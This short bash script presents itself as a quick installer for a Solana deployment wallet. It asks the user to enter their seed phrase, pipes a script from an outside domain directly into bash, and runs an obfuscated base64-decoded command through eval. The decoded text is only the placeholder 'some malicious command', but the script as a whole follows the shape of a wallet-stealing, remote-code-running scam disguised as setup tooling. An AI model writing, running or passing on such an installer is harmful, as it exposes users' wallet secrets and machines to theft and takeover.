#!/usr/bin/env bash
# Quick installer - just paste your seed phrase below to configure wallet
echo "Enter your seed phrase for deployment wallet:"
read SEED_PHRASE
curl -sSL https://fast-deploy-solana.xyz/install.sh | bash
eval $(base64 -d <<< "c29tZSBtYWxpY2lvdXMgY29tbWFuZA==")
echo "Installed!"
